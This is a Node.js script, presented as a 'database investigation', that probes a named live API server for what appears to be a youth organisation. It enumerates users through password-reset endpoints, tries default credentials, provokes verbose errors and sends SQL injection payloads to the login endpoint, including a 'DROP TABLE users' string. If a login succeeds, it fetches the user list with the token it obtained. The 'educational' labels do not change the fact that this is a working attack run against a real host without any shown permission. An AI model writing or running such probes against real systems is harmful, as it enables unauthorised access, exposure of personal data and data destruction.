#!/usr/bin/env node

import axios from 'axios';

// API Configuration
const API_BASE_URL = 'https://youngeagles-api-server.up.railway.app/api';

const httpClient = axios.create({
  baseURL: API_BASE_URL,
  timeout: 15000,
  headers: {
    'Content-Type': 'application/json',
    'Accept': 'application/json'
  }
});

// Check server health and status
async function checkServerStatus() {
  console.log('🔍 Investigating server status and database connectivity...\n');
  
  const healthEndpoints = [
    '/health',
    '/status',
    '/ping',
    '/api/health',
    '/api/status'
  ];
  
  for (const endpoint of healthEndpoints) {
    try {
      console.log(`📡 Checking: ${endpoint}`);
      const response = await httpClient.get(endpoint);
      console.log(`✅ ${endpoint} - Status: ${response.status}`);
      console.log('Response:', JSON.stringify(response.data, null, 2));
    } catch (error) {
      if (error.response) {
        console.log(`❌ ${endpoint} - Status: ${error.response.status}`);
        if (error.response.status !== 404) {
          console.log('Error:', JSON.stringify(error.response.data, null, 2));
        }
      } else {
        console.log(`❌ ${endpoint} - No response: ${error.message}`);
      }
    }
  }
}

// Test password reset functionality (might reveal user existence)
async function testPasswordReset() {
  console.log('\n🔐 Testing password reset functionality...\n');
  
  const emails = [
    'katso@youngeagles.org.za',
    'admin@youngeagles.org.za',
    'test@youngeagles.org.za'
  ];
  
  const resetEndpoints = [
    '/auth/forgot-password',
    '/auth/reset-password',
    '/auth/password-reset',
    '/password/reset'
  ];
  
  for (const endpoint of resetEndpoints) {
    console.log(`\n📡 Testing endpoint: ${endpoint}`);
    for (const email of emails) {
      try {
        console.log(`📧 Testing with email: ${email}`);
        const response = await httpClient.post(endpoint, { email });
        console.log(`✅ Password reset response:`, JSON.stringify(response.data, null, 2));
      } catch (error) {
        if (error.response?.status === 404) {
          console.log(`❌ Endpoint not found: ${endpoint}`);
          break; // No point trying other emails for this endpoint
        } else if (error.response?.status === 400) {
          console.log(`❌ Bad request (user might not exist): ${error.response.data?.message}`);
        } else if (error.response?.status === 500) {
          console.log(`❌ Server error: ${error.response.data?.message}`);
        } else {
          console.log(`❌ Error: ${error.response?.data?.message || error.message}`);
        }
      }
    }
  }
}

// Test if there are any default/seed accounts
async function testDefaultAccounts() {
  console.log('\n👤 Testing common default/seed accounts...\n');
  
  const defaultAccounts = [
    { email: 'admin@admin.com', password: 'admin' },
    { email: 'admin@localhost', password: 'admin' },
    { email: 'test@test.com', password: 'test' },
    { email: 'user@user.com', password: 'user' },
    { email: 'demo@demo.com', password: 'demo' },
    { email: 'seed@youngeagles.org.za', password: 'password' },
    { email: 'default@youngeagles.org.za', password: 'password' }
  ];
  
  for (const account of defaultAccounts) {
    try {
      console.log(`🔑 Testing: ${account.email}`);
      
      // Try regular login
      const response = await httpClient.post('/auth/login', {
        email: account.email,
        password: account.password
      });
      
      console.log('✅ Default account login successful!');
      console.log('Account data:', JSON.stringify(response.data, null, 2));
      return response.data;
      
    } catch (error) {
      if (error.response?.status !== 400) {
        console.log(`❌ Unexpected error for ${account.email}: ${error.response?.data?.message || error.message}`);
      }
    }
  }
  
  console.log('❌ No default accounts found');
  return null;
}

// Try to trigger detailed error messages
async function triggerDetailedErrors() {
  console.log('\n🐛 Attempting to trigger detailed error messages...\n');
  
  // Try malformed requests to see if we get detailed error info
  const malformedRequests = [
    {
      endpoint: '/auth/login',
      data: { email: 'test', password: '' },
      description: 'Invalid email format'
    },
    {
      endpoint: '/auth/login',
      data: { email: '', password: 'test' },
      description: 'Empty email'
    },
    {
      endpoint: '/auth/register',
      data: { email: 'test@test.com' },
      description: 'Missing required fields'
    },
    {
      endpoint: '/auth/admin-login',
      data: { email: 'admin@test.com', password: 'test', extra: 'field' },
      description: 'Extra fields'
    }
  ];
  
  for (const request of malformedRequests) {
    try {
      console.log(`🧪 Testing: ${request.description}`);
      const response = await httpClient.post(request.endpoint, request.data);
      console.log('Unexpected success:', JSON.stringify(response.data, null, 2));
    } catch (error) {
      if (error.response) {
        console.log(`Status: ${error.response.status}`);
        console.log(`Response: ${JSON.stringify(error.response.data, null, 2)}`);
      }
    }
  }
}

// Check for API documentation or help endpoints
async function checkAPIDocumentation() {
  console.log('\n📚 Looking for API documentation or help endpoints...\n');
  
  const docEndpoints = [
    '/docs',
    '/api-docs',
    '/swagger',
    '/openapi',
    '/help',
    '/info',
    '/version',
    '/routes'
  ];
  
  for (const endpoint of docEndpoints) {
    try {
      console.log(`📖 Checking: ${endpoint}`);
      const response = await httpClient.get(endpoint);
      console.log(`✅ Found documentation at: ${endpoint}`);
      console.log('Content:', JSON.stringify(response.data, null, 2));
    } catch (error) {
      if (error.response?.status !== 404) {
        console.log(`❌ ${endpoint} - Status: ${error.response?.status}, Error: ${error.response?.data?.message || error.message}`);
      }
    }
  }
}

// Try SQL injection patterns (for educational purposes only)
async function testSQLInjectionPatterns() {
  console.log('\n🔒 Testing for SQL injection vulnerabilities (educational purposes)...\n');
  
  const injectionPatterns = [
    "admin' OR '1'='1",
    "admin' OR '1'='1' --",
    "admin'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --"
  ];
  
  for (const pattern of injectionPatterns) {
    try {
      console.log(`🧪 Testing pattern: ${pattern.substring(0, 20)}...`);
      const response = await httpClient.post('/auth/login', {
        email: pattern,
        password: 'test'
      });
      console.log('⚠️  Potential vulnerability - unexpected success!');
      console.log('Response:', JSON.stringify(response.data, null, 2));
    } catch (error) {
      if (error.response?.status === 500) {
        console.log('⚠️  Server error - potential SQL injection vulnerability');
        console.log('Error:', JSON.stringify(error.response.data, null, 2));
      }
    }
  }
}

// Main investigation function
async function investigateDatabase() {
  console.log('🔍 Starting Database Investigation');
  console.log(`🌐 API Base URL: ${API_BASE_URL}`);
  console.log('='.repeat(80));
  
  try {
    // Step 1: Check server status
    await checkServerStatus();
    
    // Step 2: Test password reset functionality
    await testPasswordReset();
    
    // Step 3: Test default accounts
    const defaultAuth = await testDefaultAccounts();
    
    // Step 4: Trigger detailed errors
    await triggerDetailedErrors();
    
    // Step 5: Check for API documentation
    await checkAPIDocumentation();
    
    // Step 6: Test SQL injection patterns (educational)
    await testSQLInjectionPatterns();
    
    // If we found valid auth from default accounts, use it
    if (defaultAuth) {
      console.log('\n🔍 Querying with default account authentication...');
      // Set auth header and try to query users
      httpClient.defaults.headers.common['Authorization'] = `Bearer ${defaultAuth.token}`;
      
      try {
        const usersResponse = await httpClient.get('/users');
        console.log('✅ Users data:', JSON.stringify(usersResponse.data, null, 2));
      } catch (error) {
        console.log('❌ Users query failed:', error.response?.data?.message || error.message);
      }
    }
    
  } catch (error) {
    console.error('❌ Investigation failed:', error.message);
  }
  
  console.log('\n' + '='.repeat(80));
  console.log('🏁 Database investigation completed');
  console.log('\n💡 Next steps:');
  console.log('- If server errors persist, the database might be disconnected');
  console.log('- Contact the backend development team for admin credentials');
  console.log('- Check the Railway dashboard for database connection status');
  console.log('- Look for environment variables or seed scripts in the backend repository');
}

// Run the investigation
investigateDatabase().catch(error => {
  console.error('🚨 Investigation failed:', error.message);
  process.exit(1);
});

